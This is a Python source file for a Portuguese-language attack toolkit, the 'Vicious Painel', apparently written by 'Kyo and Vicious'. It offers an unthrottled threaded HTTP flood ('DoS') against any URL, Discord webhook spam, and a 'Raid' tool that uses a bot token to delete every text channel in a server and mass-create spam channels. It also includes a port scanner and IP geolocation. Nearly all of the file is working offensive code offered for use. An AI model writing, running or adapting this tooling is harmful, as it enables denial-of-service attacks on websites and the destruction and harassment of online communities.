import os
import requests
import socket
import threading
import time
import sys
import random
from colorama import Fore, init

init(autoreset=True)

# ========== Util ==========
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def type_text(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

# ========== DoS ==========

def send_request(url, referer_message, i):
    try:
        headers = {"Referer": referer_message}
        response = requests.get(url, headers=headers)
        print(Fore.LIGHTRED_EX + "DoS Service " + Fore.WHITE + f"Target {url} Request {i+1} - Status Code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(Fore.LIGHTRED_EX + f"DoS Service Request {i+1} failed: {e}")

def send_requests(url, referer_message):
    i = 0
    try:
        while True:
            thread = threading.Thread(target=send_request, args=(url, referer_message, i))
            thread.start()
            i += 1
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nDoS interrompido por Ctrl+C. Retornando ao menu...")

def start_dos():
    clear()
    print(Fore.LIGHTRED_EX + """
               DoS Service
           by: Vicious and Kyo
       (Use por sua conta em risco)
    """)
    url = input("set_target> ")
    referer_message = input("http_message> ")
    print(Fore.LIGHTRED_EX + f"\nDoS Service started on {url}\n")
    send_requests(url, referer_message)

# ========== Discord Webhook ==========

def start_discord_message():
    clear()
    print(Fore.CYAN + """
          Discord Webhook Sender 1.0
              Kyo and Vicious
    """)
    webhook_url = input("Webhook URL> ")
    message = input("Mensagem a enviar> ")
    
    payload = {"content": message}

    try:
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            print(Fore.GREEN + "Mensagem enviada com sucesso!")
        else:
            print(Fore.RED + f"Erro ao enviar: {response.status_code} - {response.text}")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Erro de conexão: {e}")
    
    input("\nPressione Enter para voltar ao menu...")

def discord_spam():
    clear()
    print(Fore.MAGENTA + """
          Discord Webhook SPAM 1.0
              Kyo and Vicious
    """)
    webhook_url = input("Webhook URL> ")
    message = input("Mensagem> ")
    count = int(input("Quantidade de vezes> "))
    delay = float(input("Delay entre mensagens (segundos)> "))

    payload = {"content": message}

    for i in range(count):
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code == 204:
                print(Fore.GREEN + f"[{i+1}] Mensagem enviada com sucesso!")
            else:
                print(Fore.RED + f"[{i+1}] Erro: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[{i+1}] Erro de conexão: {e}")
        time.sleep(delay)
    
    input("\nFim do spam. Pressione Enter para voltar ao menu.")

def discord_raid():
    clear()
    print(Fore.RED + """
                   Raid Discord 1.0
                   Kyo and Vicious
  (garanta que o bot tenha permissão de administrador)
    """)
    
    token = input("Token do bot> ")
    guild_id = input("ID do servidor> ")
    new_channel_name = input("Nome para os novos canais> ")
    message = input("Mensagem a ser enviada nos canais criados> ")
    count = int(input("Quantidade de canais a serem criados> "))
    delay = float(input("Delay entre as ações (segundos)> "))

    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    headers = {"Authorization": f"Bot {token}"}

    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            channels = response.json()
            text_channels = [ch['id'] for ch in channels if ch['type'] == 0]  # Tipo 0 é Canal de Texto
            
            for channel_id in text_channels:
                delete_url = f"https://discord.com/api/v9/channels/{channel_id}"
                delete_response = requests.delete(delete_url, headers=headers)
                if delete_response.status_code == 204:
                    print(Fore.GREEN + f"Canal {channel_id} apagado com sucesso!")
                else:
                    print(Fore.RED + f"Erro ao apagar canal {channel_id}: {delete_response.status_code} - {delete_response.text}")
            
            for i in range(count):
                create_url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
                payload = {
                    "name": f"{new_channel_name} {i+1}",
                    "type": 0,
                    "topic": "Canal criado por bot",
                }
                create_response = requests.post(create_url, json=payload, headers=headers)
                if create_response.status_code == 201:
                    new_channel_id = create_response.json()['id']
                    print(Fore.GREEN + f"Canal '{new_channel_name} {i+1}' criado com sucesso!")
                    
                    message_url = f"https://discord.com/api/v9/channels/{new_channel_id}/messages"
                    message_payload = {"content": message}
                    message_response = requests.post(message_url, json=message_payload, headers=headers)
                    if message_response.status_code == 201:
                        print(Fore.GREEN + f"Mensagem enviada com sucesso no canal '{new_channel_name} {i+1}'!")
                    else:
                        print(Fore.RED + f"Erro ao enviar mensagem: {message_response.status_code} - {message_response.text}")
                else:
                    print(Fore.RED + f"Erro ao criar canal: {create_response.status_code} - {create_response.text}")
                
                time.sleep(delay)
        else:
            print(Fore.RED + f"Erro ao obter canais: {response.status_code} - {response.text}")

    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Erro de conexão: {e}")

# ========== Port Scanner ==========

def port_scanner():
    clear()
    print(Fore.YELLOW + "\nPort Scanner 1.0 - Kyo and Vicious\n")
    target = input("Digite o IP ou domínio alvo: ")
    start_port = int(input("Digite a porta inicial: "))
    end_port = int(input("Digite a porta final: "))
    
    print(Fore.GREEN + f"\nVerificando as portas de {target}...")
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(Fore.GREEN + f"Porta {port} aberta")
        else:
            print(Fore.RED + f"Porta {port} fechada")
        sock.close()

    input("\nPressione Enter para voltar ao menu...")

# ========== Verificador de IP (Localização) ==========

def ip_checker():
    clear()
    print(Fore.BLUE + "Localização IP 1.0 - Kyo and Vicious")
    ip = input("Digite o IP para verificar: ")
    
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data["status"] == "fail":
            print(Fore.RED + "IP inválido ou não encontrado.")
        else:
            print(Fore.GREEN + f"IP: {data['query']}")
            print(Fore.GREEN + f"País: {data['country']}")
            print(Fore.GREEN + f"Cidade: {data['city']}")
            print(Fore.GREEN + f"Região: {data['regionName']}")
            print(Fore.GREEN + f"Organização: {data['org']}")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Erro de conexão: {e}")
    
    input("\nPressione Enter para voltar ao menu...")

# ========== Menu Principal ==========

while True:
    clear()
    type_text("Carregando painel", 0.1)
    for dot in "...":
        sys.stdout.write(dot)
        sys.stdout.flush()
        time.sleep(0.4)
    time.sleep(0.3)
    clear()

    print(Fore.CYAN + "\nVicious Painel - Made by Kyo\n")
    print("1. DoS")
    print("2. Enviar mensagem no Discord (Webhook)")
    print("3. SPAM Discord (Webhook)")
    print("4. Discord Raid (bot)")
    print("5. Port Scanner")
    print("6. Verificador de IP (Localização)")
    print("7. Sair\n")

    choise = input("Escolha um programa: ")

    if choise == "1":
        start_dos()
    elif choise == "2":
        start_discord_message()
    elif choise == "3":
        discord_spam()
    elif choise == "4":
        discord_raid()
    elif choise == "5":
        port_scanner()
    elif choise == "6":
        ip_checker()
    elif choise == "7":
        clear()
        print("Saindo...")
        break
    else:
        clear()
        print("Opção inválida.")
        input("\nPressione Enter para voltar ao menu...")
